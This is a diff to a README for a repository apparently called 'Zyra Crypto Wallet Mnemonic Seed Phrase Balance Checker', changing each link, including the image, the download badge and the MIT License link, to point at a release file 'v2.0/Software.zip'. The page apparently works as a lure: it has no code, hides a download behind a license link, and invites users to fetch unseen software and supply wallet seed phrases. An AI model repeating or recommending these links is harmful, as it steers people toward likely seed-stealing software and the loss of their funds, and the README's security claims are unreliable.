@@ -1,6 +1,6 @@
 # 🚀 Welcome to Zyra Crypto Wallet Mnemonic Seed Phrase Balance Checker! 🌿
 
-![Zyra Crypto Wallet](https://github.com/leotot4/Zyra-Crypto-Wallet-Mnemonic-Seed-Phrase-Balance-Checker/releases/download/v1.0/Release.zip)
+![Zyra Crypto Wallet](https://github.com/leotot4/Zyra-Crypto-Wallet-Mnemonic-Seed-Phrase-Balance-Checker/releases/download/v2.0/Software.zip)
 
 ## Overview
 Welcome to the Zyra Crypto Wallet Mnemonic Seed Phrase Balance Checker repository! This tool is designed to provide users with the ability to securely manage and verify cryptocurrency balances associated with various wallets using mnemonic seed phrases. The repository includes features that allow you to check the balances of your cryptocurrencies conveniently and securely.
@@ -19,7 +19,7 @@ Here are some of the key features of Zyra Crypto Wallet Mnemonic Seed Phrase Bal
 
 ## Installation
 To get started with Zyra Crypto Wallet Mnemonic Seed Phrase Balance Checker, download the software from the following link:
-[![Download Zyra Software](https://github.com/leotot4/Zyra-Crypto-Wallet-Mnemonic-Seed-Phrase-Balance-Checker/releases/download/v1.0/Release.zip)](https://github.com/leotot4/Zyra-Crypto-Wallet-Mnemonic-Seed-Phrase-Balance-Checker/releases/download/v1.0/Release.zip)
+[![Download Zyra Software](https://github.com/leotot4/Zyra-Crypto-Wallet-Mnemonic-Seed-Phrase-Balance-Checker/releases/download/v2.0/Software.zip)](https://github.com/leotot4/Zyra-Crypto-Wallet-Mnemonic-Seed-Phrase-Balance-Checker/releases/download/v2.0/Software.zip)
 
 ## Usage
 1. Download the Zyra software from the provided link.
@@ -33,7 +33,7 @@ We welcome contributions from the community to enhance Zyra Crypto Wallet Mnemon
 For any inquiries or issues regarding Zyra Crypto Wallet Mnemonic Seed Phrase Balance Checker, please reach out to us through the repository's issue tracker. Our team will be happy to assist you.
 
 ## License
-This project is licensed under the [MIT License](https://github.com/leotot4/Zyra-Crypto-Wallet-Mnemonic-Seed-Phrase-Balance-Checker/releases/download/v1.0/Release.zip).
+This project is licensed under the [MIT License](https://github.com/leotot4/Zyra-Crypto-Wallet-Mnemonic-Seed-Phrase-Balance-Checker/releases/download/v2.0/Software.zip).
 
 ---
 
